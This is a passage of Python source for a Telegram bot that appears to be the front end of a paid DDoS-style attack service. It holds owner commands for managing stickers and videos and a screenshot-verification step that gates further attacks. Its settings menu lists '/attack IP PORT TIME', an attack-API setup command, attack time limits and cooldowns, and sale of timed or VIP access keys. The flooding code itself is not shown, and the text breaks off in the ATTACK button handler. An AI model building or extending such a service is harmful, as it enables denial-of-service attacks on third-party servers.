            return
        txt = (
            "╔═════════════════════════╗\n"
            "║                ❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗟𝗜𝗦𝗧 🐻‍❄️             ║\n"
            "╚═════════════════════════╝\n\n"
            f"  📊 <b>ᴛᴏᴛᴀʟ:</b> {len(stickers)} ꜱᴛɪᴄᴋᴇʀꜱ\n\n"
            "╔═════════════════════════╗\n"
            "┃                 🌐 𝗔𝗟𝗟 𝗦𝗧𝗜𝗖𝗞𝗘𝗥𝗦 🎨           ┃\n"
            "╚═════════════════════════╝\n"
        )
        for i, s in enumerate(stickers, 1):
            txt += f"  ◆ <b>{i:02d}.</b> <code>{s[:40]}...</code>\n"
        txt += (
            "\n┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃           🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 🗑️       ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ➤ <code>/removesticker NUM</code>\n"
        )
        safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e: print(f"❌ liststickers error: {e}")

@bot.message_handler(commands=['removesticker'])
def cmd_removesticker(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║            🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 🗑️            ║\n"
                "╚══════════════════════════╝\n\n"
                "  📝 <code>/removesticker NUM</code>\n\n"
                "  📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
                "  ➤ <code>/removesticker 2</code>",
                parse_mode="HTML")
            return
        try:
            idx = int(p[1]) - 1
            stickers = ensure_list(data.get("stickers", []))
            if 0 <= idx < len(stickers):
                removed = stickers.pop(idx)
                save_data(data)
                # Reset pool so it refills
                global _sticker_pool
                _sticker_pool = []
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "║           ✅ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 ✅           ║\n"
                    "╚══════════════════════════╝\n\n"
                    f"  ◆ 🗑️ ʀᴇᴍᴏᴠᴇᴅ ➪ <b>#{p[1]}</b>\n"
                    f"  ◆ 📊 ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{len(stickers)}</b>",
                    parse_mode="HTML")
            else:
                safe_reply(msg, f"❌ <b>ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!</b> ᴛᴏᴛᴀʟ {len(stickers)} ʜᴀɪɴ", parse_mode="HTML")
        except:
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!</b>", parse_mode="HTML")
    except Exception as e: print(f"❌ removesticker error: {e}")

@bot.message_handler(commands=['listvideo'])
def cmd_listvideo(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        videos = ensure_list(data.get("videos", []))
        if not videos:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║                   📹 𝗩𝗜𝗗𝗘𝗢 𝗟𝗜𝗦𝗧 📹                  ║\n"
                "╚══════════════════════════╝\n\n"
                "  📂 <b>ᴋᴏɪ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ</b>\n\n"
                "  📌 <b>ᴀᴅᴅ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ:</b>\n"
                "  ◆ ᴋᴏɪ ʙʜɪ ᴠɪᴅᴇᴏ ʙᴏᴛ ᴋᴏ ʙʜᴇᴊᴏ\n"
                "  ◆ ᴠᴏ ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ ᴀᴅᴅ ʜᴏ ᴊᴀʏᴇɢᴀ\n"
                "  ◆ ʏᴇ ᴠɪᴅᴇᴏ <b>ᴀᴛᴛᴀᴄᴋ</b> ᴍᴇ ᴜꜱᴇ ʜᴏɢᴀ",
                parse_mode="HTML")
            return
        txt = (
            "╔══════════════════════════╗\n"
            "║                   📹 𝗩𝗜𝗗𝗘𝗢 𝗟𝗜𝗦𝗧 📹                  ║\n"
            "╚══════════════════════════╝\n\n"
            f"  📊 <b>ᴛᴏᴛᴀʟ:</b> {len(videos)} ᴠɪᴅᴇᴏꜱ\n"
            "  ⚡ <b>ᴜꜱᴇ:</b> ᴀᴛᴛᴀᴄᴋ ᴍᴇ ʀᴀɴᴅᴏᴍ ᴀᴀʏᴇɢᴀ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃                  🎬 𝗔𝗟𝗟 𝗩𝗜𝗗𝗘𝗢𝗦 🎬               ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        )
        for i, v in enumerate(videos, 1):
            txt += f"  ◆ <b>{i:02d}.</b> <code>{v[:40]}...</code>\n"
        txt += (
            "\n┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃           🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 🗑️      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ➤ <code>/delvideo NUM</code>\n"
        )
        safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e: print(f"❌ listvideo error: {e}")

@bot.message_handler(commands=['delvideo'])
def cmd_delvideo(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "┃               🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗩𝗜𝗗𝗘𝗢 🗑️              ┃\n"
                "╚══════════════════════════╝\n\n"
                "  📝 <code>/delvideo NUM</code>\n\n"
                "  📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
                "  ➤ <code>/delvideo 2</code>",
                parse_mode="HTML")
            return
        try:
            idx = int(p[1]) - 1
            videos = ensure_list(data.get("videos", []))
            if 0 <= idx < len(videos):
                videos.pop(idx)
                save_data(data)
                global _video_pool
                _video_pool = []
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "┃              ✅ 𝗩𝗜𝗗𝗘𝗢 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 ✅            ┃\n"
                    "╚══════════════════════════╝\n\n"
                    f"  ◆ 🗑️ ʀᴇᴍᴏᴠᴇᴅ ➪ <b>#{p[1]}</b>\n"
                    f"  ◆ 📊 ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{len(videos)}</b>",
                    parse_mode="HTML")
            else:
                safe_reply(msg, f"❌ <b>ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!</b> ᴛᴏᴛᴀʟ {len(videos)} ʜᴀɪɴ", parse_mode="HTML")
        except:
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!</b>", parse_mode="HTML")
    except Exception as e: print(f"❌ delvideo error: {e}")

_pending_pyf = {}

@bot.message_handler(commands=['addpyf'])
def cmd_addpyf(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        _pending_pyf[msg.from_user.id] = True
        safe_reply(msg,
            "╔══════════════════════════╗\n"
            "┃                🎬 𝗔𝗗𝗗 𝗣𝗬𝗙 𝗩𝗜𝗗𝗘𝗢 🎬             ┃\n"
            "╚══════════════════════════╝\n\n"
            "  📤 <b>ᴀʙ ᴋᴏɪ ᴠɪᴅᴇᴏ ʙᴏᴛ ᴋᴏ ʙʜᴇᴊᴏ</b>\n\n"
            "  ⚡ <b>ᴜꜱᴇ:</b>\n"
            "  ◆ ʏᴇ ᴠɪᴅᴇᴏ <code>/start</code> ᴍᴇ ᴀᴀʏᴇɢᴀ\n"
            "  ◆ ʀᴀɴᴅᴏᴍ ꜱᴇʟᴇᴄᴛ ʜᴏᴋᴀʀ ᴅɪᴋʜᴇɢᴀ\n\n"
            "  ⏳ <b>ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ᴠɪᴅᴇᴏ...</b>",
            parse_mode="HTML")
    except Exception as e: print(f"❌ addpyf error: {e}")

@bot.message_handler(commands=['listpyf'])
def cmd_listpyf(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        pyfs = ensure_list(data.get("pyf_videos", []))
        if not pyfs:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "┃                🎬 𝗣𝗬𝗙 𝗩𝗜𝗗𝗘𝗢 𝗟𝗜𝗦𝗧 🎬             ┃\n"
                "╚══════════════════════════╝\n\n"
                "  📂 <b>ᴋᴏɪ ᴘʏꜰ ᴠɪᴅᴇᴏ ɴᴀʜɪ ʜᴀɪ</b>\n\n"
                "  📌 <b>ᴀᴅᴅ ᴋᴀʀɴᴇ ᴋᴇ ʟɪʏᴇ:</b>\n"
                "  ➤ <code>/addpyf</code> ᴋᴀʀᴏ\n"
                "  ➤ ᴘʜɪʀ ᴠɪᴅᴇᴏ ʙʜᴇᴊᴏ",
                parse_mode="HTML")
            return
        txt = (
            "╔══════════════════════════╗\n"
            "┃                🎬 𝗣𝗬𝗙 𝗩𝗜𝗗𝗘𝗢 𝗟𝗜𝗦𝗧 🎬             ┃\n"
            "╚══════════════════════════╝\n\n"
            f"  📊 <b>ᴛᴏᴛᴀʟ:</b> {len(pyfs)} ᴘʏꜰ ᴠɪᴅᴇᴏꜱ\n"
            "  ⚡ <b>ᴜꜱᴇ:</b> <code>/start</code> ᴍᴇ ʀᴀɴᴅᴏᴍ ᴀᴀʏᴇɢᴀ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃               🎬 𝗔𝗟𝗟 𝗣𝗬𝗙 𝗩𝗜𝗗𝗘𝗢𝗦 🎬          ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
        )
        for i, v in enumerate(pyfs, 1):
            txt += f"  ◆ <b>{i:02d}.</b> <code>{v[:40]}...</code>\n"
        txt += (
            "\n┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃           🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 🗑️      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ➤ <code>/delpyf NUM</code>\n"
        )
        safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e: print(f"❌ listpyf error: {e}")

@bot.message_handler(commands=['delpyf'])
def cmd_delpyf(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "┃                  🗑️ 𝗥𝗘𝗠𝗢𝗩𝗘 𝗣𝗬𝗙 🗑️                ┃\n"
                "╚══════════════════════════╝\n\n"
                "  📝 <code>/delpyf NUM</code>\n\n"
                "  📌 <b>ᴇxᴀᴍᴘʟᴇ:</b>\n"
                "  ➤ <code>/delpyf 2</code>",
                parse_mode="HTML")
            return
        try:
            idx = int(p[1]) - 1
            pyfs = ensure_list(data.get("pyf_videos", []))
            if 0 <= idx < len(pyfs):
                pyfs.pop(idx)
                save_data(data)
                # Reset global PYF rotation
                global _pyf_global_index
                _pyf_global_index = [0]
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "┃                ✅ 𝗣𝗬𝗙 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 ✅               ┃\n"
                    "╚══════════════════════════╝\n\n"
                    f"  ◆ 🗑️ ʀᴇᴍᴏᴠᴇᴅ ➪ <b>#{p[1]}</b>\n"
                    f"  ◆ 📊 ʀᴇᴍᴀɪɴɪɴɢ ➪ <b>{len(pyfs)}</b>",
                    parse_mode="HTML")
            else:
                safe_reply(msg, f"❌ <b>ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!</b> ᴛᴏᴛᴀʟ {len(pyfs)} ʜᴀɪɴ", parse_mode="HTML")
        except:
            safe_reply(msg, "❌ <b>ɪɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!</b>", parse_mode="HTML")
    except Exception as e: print(f"❌ delpyf error: {e}")

# ============= ★★★ CONTENT HANDLERS — STICKER/VIDEO AUTO ADD ★★★ =============
@bot.message_handler(content_types=['sticker'])
def auto_sticker(msg):
    react_to_message(msg)
    try:
        uid = msg.from_user.id
        if is_banned(uid): return
        if not is_owner(uid): return
        file_id = msg.sticker.file_id
        stickers = ensure_list(data.get("stickers", []))
        if file_id not in stickers:
            data["stickers"].append(file_id)
            save_data(data)
            # ★ RESET POOL SO NEW STICKER IS INCLUDED ★
            global _sticker_pool
            _sticker_pool = []
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "┃              ✅ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗔𝗗𝗗𝗘𝗗 ✅             ┃\n"
                "╚══════════════════════════╝\n\n"
                f"  ◆ 📊 ᴛᴏᴛᴀʟ ➪ <b>{len(data['stickers'])}</b> ꜱᴛɪᴄᴋᴇʀꜱ\n"
                "  ◆ ⚡ ᴜꜱᴇ ➪ <code>/start</code> ᴍᴇ ᴀᴀʏᴇɢᴀ\n\n"
                "╔══════════════════════════╗\n"
                "┃        🎨 ɴᴇxᴛ ꜱᴛᴀʀᴛ ᴍᴇ ᴅɪᴋʜᴇɢᴀ 🎨           ┃\n"
                "╚══════════════════════════╝",
                parse_mode="HTML")
        else:
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "┃              ⚠️ 𝗔𝗟𝗥𝗘𝗔𝗗𝗬 𝗔𝗗𝗗𝗘𝗗 ⚠️            ┃\n"
                "╚══════════════════════════╝\n\n"
                "  ℹ️ <b>ʏᴇ ꜱᴛɪᴄᴋᴇʀ ᴘᴇʜʟᴇ ꜱᴇ ᴀᴅᴅ ʜᴀɪ</b>",
                parse_mode="HTML")
    except Exception as e: print(f"❌ auto_sticker error: {e}")

@bot.message_handler(content_types=['video'])
def handle_video(msg):
    react_to_message(msg)
    try:
        uid = msg.from_user.id
        if is_banned(uid): return
        if not is_owner(uid): return
        file_id = msg.video.file_id
        if _pending_pyf.get(uid):
            _pending_pyf[uid] = False
            pyfs = ensure_list(data.get("pyf_videos", []))
            if file_id not in pyfs:
                data["pyf_videos"].append(file_id)
                save_data(data)
                # Reset global PYF rotation
                global _pyf_global_index
                _pyf_global_index = [0]
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "┃            ✅ 𝗣𝗬𝗙 𝗩𝗜𝗗𝗘𝗢 𝗔𝗗𝗗𝗘𝗗 ✅            ┃\n"
                    "╚══════════════════════════╝\n\n"
                    f"  ◆ 📊 ᴛᴏᴛᴀʟ ➪ <b>{len(data['pyf_videos'])}</b> ᴘʏꜰ ᴠɪᴅᴇᴏꜱ\n"
                    "  ◆ ⚡ ᴜꜱᴇ ➪ <code>/start</code> ᴍᴇ ᴀᴀʏᴇɢᴀ\n\n"
                    "╔══════════════════════════╗\n"
                    "┃        🧟 ɴᴇxᴛ ꜱᴛᴀʀᴛ ᴍᴇ ᴅɪᴋʜᴇɢᴀ 🚻           ┃\n"
                    "╚══════════════════════════╝",
                    parse_mode="HTML")
            else:
                safe_reply(msg, "ℹ️ <b>ʏᴇ ᴘʏꜰ ᴠɪᴅᴇᴏ ᴘᴇʜʟᴇ ꜱᴇ ᴀᴅᴅ ʜᴀɪ</b>", parse_mode="HTML")
        else:
            videos = ensure_list(data.get("videos", []))
            if file_id not in videos:
                data["videos"].append(file_id)
                save_data(data)
                global _video_pool
                _video_pool = []
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "┃                  ✅ 𝗩𝗜𝗗𝗘𝗢 𝗔𝗗𝗗𝗘𝗗 ✅              ┃\n"
                    "╚══════════════════════════╝\n\n"
                    f"  ◆ 📊 ᴛᴏᴛᴀʟ ➪ <b>{len(data['videos'])}</b> ᴠɪᴅᴇᴏꜱ\n"
                    "  ◆ ⚡ ᴜꜱᴇ ➪ <b>ᴀᴛᴛᴀᴄᴋ</b> ᴍᴇ ᴀᴀʏᴇɢᴀ\n\n"
                    "╔══════════════════════════╗\n"
                    "┃         📹 ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ᴍᴇ ᴅɪᴋʜᴇɢᴀ 📹        ┃\n"
                    "╚══════════════════════════╝",
                    parse_mode="HTML")
            else:
                safe_reply(msg, "ℹ️ <b>ʏᴇ ᴠɪᴅᴇᴏ ᴘᴇʜʟᴇ ꜱᴇ ᴀᴅᴅ ʜᴀɪ</b>", parse_mode="HTML")
    except Exception as e: print(f"❌ handle_video error: {e}")

@bot.message_handler(content_types=['photo'])
def handle_photo(msg):
    react_to_message(msg)
    try:
        uid = msg.from_user.id
        if is_banned(uid): return
        if not is_owner(uid) and str(uid) in ensure_dict(data.get("pending_attacks", {})):
            photo = msg.photo[-1]
            photo_hash = str(photo.file_unique_id)

            # ★ DUPLICATE CHECK ★
            if photo_hash in feedback_db.get("image_hashes", {}):
                prev_id = feedback_db["image_hashes"][photo_hash]
                safe_reply(msg,
                    "╔══════════════════════════╗\n"
                    "║             ⚠️ 𝗗𝗨𝗣𝗟𝗜𝗖𝗔𝗧𝗘 𝗜𝗠𝗔𝗚𝗘 ⚠️          ║\n"
                    "╚══════════════════════════╝\n\n"
                    "  🚫 <b>ʏᴇʜ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ᴘᴇʜʟᴇ ꜱᴇ ᴜꜱᴇ ʜᴏ ᴄʜᴜᴋᴀ ʜᴀɪ!</b>\n\n"
                    "  ⚠️ <b>ᴋʀɪᴘʏᴀ ɴᴀʏᴀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʙʜᴇᴊᴇ</b>\n\n"
                    "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"  ◆ 🆔 ᴘʀᴇᴠɪᴏᴜꜱ ꜰᴇᴇᴅʙᴀᴄᴋ ➪ <code>{prev_id}</code>\n\n"
                    "  📌 <b>ʜᴀʀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ᴋᴀ ᴀʟᴀɢ ɪᴅ ʙᴀɴᴛᴀ ʜᴀɪ</b>",
                    parse_mode="HTML", reply_markup=dev_btn_kb())
                return

            feedback_id = generate_feedback_id()
            feedback_db["image_hashes"][photo_hash] = feedback_id
            save_feedback_db(feedback_db)

            # ★ PENDING ATTACK VERIFY ★
            attack_details = data["pending_attacks"].get(str(uid), {})
            if str(uid) in data["pending_attacks"]:
                del data["pending_attacks"][str(uid)]
                save_data(data)

            # ★ USER KO CONFIRMATION ★
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║      ☑️ 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 𝗥𝗘𝗖𝗘𝗜𝗩𝗘𝗗 ☑️     ║\n"
                "╚══════════════════════════╝\n\n"
                "  🎉 <b>ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ᴠᴇʀɪꜰɪᴇᴅ!</b>\n\n"
                f"  ◆ 🆔 ꜰᴇᴇᴅʙᴀᴄᴋ ɪᴅ ➪ <code>{feedback_id}</code>\n\n"
                "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "  📌 <b>ᴀᴀᴘ ᴀʙ ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ʟᴀɢᴀ ꜱᴀᴋᴛᴇ ʜᴏ</b>",
                parse_mode="HTML")

            # ★ OWNER KO PHOTO + TEXT ★
            try:
                if msg.caption and msg.caption.strip():
                    user_text = escape_html(msg.caption.strip())
                else:
                    user_text = "❌ ᴋᴏɪ ᴛᴇxᴛ ɴᴀʜɪ ʙʜᴇᴊᴀ (ꜱɪʀꜰ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ)"

                owner_caption = (
                    "╔══════════════════════════╗\n"
                    "║             📸 𝗡𝗘𝗪 𝗦𝗖𝗥𝗘𝗘𝗡𝗦𝗛𝗢𝗧 📸        ║\n"
                    "╚══════════════════════════╝\n\n"
                    f"  ◆ 🆔 ꜰᴇᴇᴅʙᴀᴄᴋ ɪᴅ ➪ <code>{feedback_id}</code>\n"
                    f"  ◆ 👤 ᴜꜱᴇʀ ➪ <code>{uid}</code>\n"
                    f"  ◆ 🔗 @{escape_html(msg.from_user.username or msg.from_user.first_name or 'User')}\n"
                    f"  ◆ 🎯 ᴀᴛᴛᴀᴄᴋ ➪ <code>{attack_details.get('attack_cmd', 'N/A')}</code>\n"
                    f"  ◆ 📅 ᴛɪᴍᴇ ➪ <code>{ist_time_str()} IST</code>\n\n"
                    "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                    "┃                   💬 ᴜꜱᴇʀ ᴋᴀ ᴛᴇxᴛ 💬              ┃\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                    f"  {user_text}\n"
                    "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "  📌 <b>ᴜꜱᴇʀ ɴᴇ ʏᴇ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ʙʜᴇᴊᴀ ʜᴀɪ</b>"
                )
                bot.send_photo(
                    BOT_OWNER,
                    photo.file_id,
                    caption=owner_caption,
                    parse_mode="HTML"
                )
            except Exception as ow_err:
                print(f"Owner screenshot notify error: {ow_err}")
    except Exception as e: print(f"❌ handle_photo error: {e}")
        
# ============= FEEDBACK =============
@bot.message_handler(commands=['feedback'])
def cmd_feedback(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2:
            cur = "🟢 ᴏɴ" if data.get("feedback_enabled", False) else "🔴 ᴏꜰꜰ"
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "┃             🍇 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞 𝗦𝗬𝗦𝗧𝗘𝗠 🥪        ┃\n"
                "╚══════════════════════════╝\n\n"
                f"  ◆ 📊 ᴄᴜʀʀᴇɴᴛ ꜱᴛᴀᴛᴜꜱ ➪ {cur}\n\n"
                "  ◆ 📝 <code>/feedback on</code>\n"
                "  ◆ 📝 <code>/feedback off</code>\n"
                "  ◆ 📝 <code>/feedback list</code>",
                parse_mode="HTML")
            return

        action = p[1].lower()
        if action == "on":
            data["feedback_enabled"] = True
            save_data(data)
            safe_reply(msg, "✅ <b>ꜰᴇᴇᴅʙᴀᴄᴋ ᴇɴᴀʙʟᴇᴅ!</b>", parse_mode="HTML")
        elif action == "off":
            data["feedback_enabled"] = False
            save_data(data)
            safe_reply(msg, "❌ <b>ꜰᴇᴇᴅʙᴀᴄᴋ ᴅɪꜱᴀʙʟᴇᴅ!</b>", parse_mode="HTML")
        elif action == "list":
            fbs = ensure_list(data.get("feedbacks", []))
            if not fbs:
                safe_reply(msg, "📂 ɴᴏ ꜰᴇᴇᴅʙᴀᴄᴋ ʏᴇᴛ.")
                return
            txt = "📩 𝗔𝗟𝗟 𝗙𝗘𝗘𝗗𝗕𝗔𝗖𝗞𝗦\n\n"
            for i, fb in enumerate(fbs[-10:], 1):
                txt += (
                    f"  ◆ <b>{i}.</b> 🆔 <code>{fb.get('id','N/A')}</code>\n"
                    f"    ◆ ⭐ {fb.get('rating','?')}/5\n"
                    f"    ◆ 👤 <code>{fb.get('user_id','?')}</code>\n"
                    f"    ◆ 💬 {escape_html(fb.get('text','N/A'))}\n\n"
                )
            safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e:
        print(f"❌ cmd_feedback error: {e}")

# ============= ★★★ SETTINGS — ALL COMMANDS SHOWN ★★★ =============
@bot.message_handler(commands=['settings'])
def cmd_settings(msg):
    react_to_message(msg)
    try:
        if not is_owner(msg.from_user.id): return
        txt = (
            "╔══════════════════════════╗\n"
            "║                ⚙️ 𝗔𝗟𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 ⚙️           ║\n"
            "╚══════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "║            👑 𝗢𝗪𝗡𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 👑       ║\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ 👑 /panel ➪ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ\n"
            "  ◆ 👥 /users ➪ ʟɪᴠᴇ ᴜꜱᴇʀꜱ\n"
            "  ◆ 📊 /stats ➪ ʙᴏᴛ ꜱᴛᴀᴛꜱ\n"
            "  ◆ 📢 /broadcast MSG ➪ ʙʀᴏᴀᴅᴄᴀꜱᴛ\n"
            "  ◆ 🚫 /ban ID REASON ➪ ʙᴀɴ ᴜꜱᴇʀ\n"
            "  ◆ ✅ /unban ID ➪ ᴜɴʙᴀɴ ᴜꜱᴇʀ\n"
            "  ◆ 📩 /feedback on|off|list\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "║                🔑 𝗞𝗘𝗬 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 🔑        ║\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ /genkey 1d 5 ➪ ɢᴇɴ 5 ᴋᴇʏꜱ\n"
            "  ◆ /genkey 1month 10 VIP ➪ ᴘʀᴇᴍɪᴜᴍ\n"
            "  ◆ /redeem KEY ➪ ʀᴇᴅᴇᴇᴍ ᴋᴇʏ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "║                 📡 𝗔𝗣𝗜 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 📡        ║\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ /setapi URL TOKEN\n"
            "  ◆ /testapi ➪ ʟɪᴠᴇ ᴛᴇꜱᴛ\n"
            "  ◆ /setmaxtime SEC\n"
            "  ◆ /setcooldown SEC\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "║                🔧 𝗕𝗢𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 🔧        ║\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ /maintenance ➪ ᴛᴏɢɢʟᴇ\n"
            "  ◆ /status ➪ ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ\n"
            "  ◆ /profile ➪ ʏᴏᴜʀ ᴘʀᴏꜰɪʟᴇ\n"
            "  ◆ /attack IP PORT TIME ➪ ᴀᴛᴛᴀᴄᴋ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "║           ❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 ❄    ║\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ ꜱᴇɴᴅ ꜱᴛɪᴄᴋᴇʀ ➪ ᴀᴅᴅ ᴋᴀʀᴏ\n"
            "  ◆ /liststickers ➪ ʟɪꜱᴛ ᴅᴇᴋʜᴏ\n"
            "  ◆ /removesticker NUM ➪ ʀᴇᴍᴏᴠᴇ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃          📹 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 📹         ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ ꜱᴇɴᴅ ᴠɪᴅᴇᴏ ➪ ᴀᴛᴛᴀᴄᴋ ᴍᴇ ᴀᴀʏᴇɢᴀ\n"
            "  ◆ /listvideo ➪ ʟɪꜱᴛ ᴅᴇᴋʜᴏ\n"
            "  ◆ /delvideo NUM ➪ ʀᴇᴍᴏᴠᴇ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃       🎬 𝗣𝗬𝗙 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 🎬    ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "  ◆ /addpyf ➪ ᴘʏꜰ ᴀᴅᴅ ᴋᴀʀᴏ\n"
            "  ◆ /listpyf ➪ ᴘʏꜰ ʟɪꜱᴛ ᴅᴇᴋʜᴏ\n"
            "  ◆ /delpyf NUM ➪ ʀᴇᴍᴏᴠᴇ\n\n"
            "╔══════════════════════════╗\n"
            "║                🍄 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗢𝗧 🦠              ║\n"
            "╚══════════════════════════╝"
        )
        safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e: print(f"❌ cmd_settings error: {e}")
        
# ============================================================
# ★★★ UNIVERSAL BUTTON HANDLER ★★★
# ============================================================
@bot.message_handler(content_types=['text'], func=lambda m: get_button_type(m.text) is not None)
def universal_button_handler(msg):
    react_to_message(msg)
    try:
        HEALTH["total_messages"] += 1
        uid = msg.from_user.id
        raw_text = msg.text or ""
        btype = get_button_type(raw_text)

        # ★ DEBUG PRINT — Raw text + normalized + type
        print(f"🔘 BUTTON RAW: {repr(raw_text)}")
        print(f"🔘 BUTTON NORMALIZED: {repr(normalize_text(raw_text))}")
        print(f"🔘 BUTTON TYPE: {btype}")

        if not btype:
            return

        if is_banned(uid):
            check_ban(msg)
            return

        if btype == "ATTACK":
            safe_reply(msg,
                "┌┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┐\n"
